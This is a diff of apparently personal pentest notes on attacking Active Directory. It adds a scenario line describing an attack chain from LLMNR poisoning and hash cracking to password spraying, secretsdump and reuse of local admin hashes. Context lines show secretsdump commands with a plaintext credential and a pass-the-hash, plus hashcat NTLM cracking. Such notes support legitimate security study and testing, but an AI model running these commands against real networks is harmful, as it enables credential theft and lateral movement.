@@ -506,6 +506,7 @@ pingcastle
 .          this tool is good for consultation. it will enumerate the whole AD and give some suggestions
 
 **Attacking AD**
+scenario: LLMNR -> raman hash -> crack -> sprayed the password -> found new login -> secretsdump -> local admin hashes -> respray the network with local accounts
 .          secretsdump.py raman.local/machine1:to0or@10.10.16.14     (dump the hashes without metasploit)
 .          secretsdump.py machine1:@10.10.16.14 -hashes <hash>     (dump the hashes without metasploit)
 .          hashcat -m <ntlm mode ex. 1000> ntlm.txt rockyou.txt     (you only need to put the NTLM portion from NT:NTLM in the ntlm.txt file)
